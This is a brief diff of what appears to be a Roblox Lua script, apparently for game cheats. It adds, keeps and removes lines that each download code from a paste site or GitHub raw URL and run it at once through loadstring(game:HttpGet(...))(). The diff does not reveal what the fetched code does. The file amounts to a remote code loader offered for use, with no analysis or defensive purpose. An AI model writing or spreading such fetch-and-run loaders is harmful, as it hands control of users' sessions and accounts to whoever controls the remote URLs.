@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/UI0CZv2e/raw"))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JandelDupes/egg-detector-randomizer/refs/heads/main/file%20(20).txt", true))()
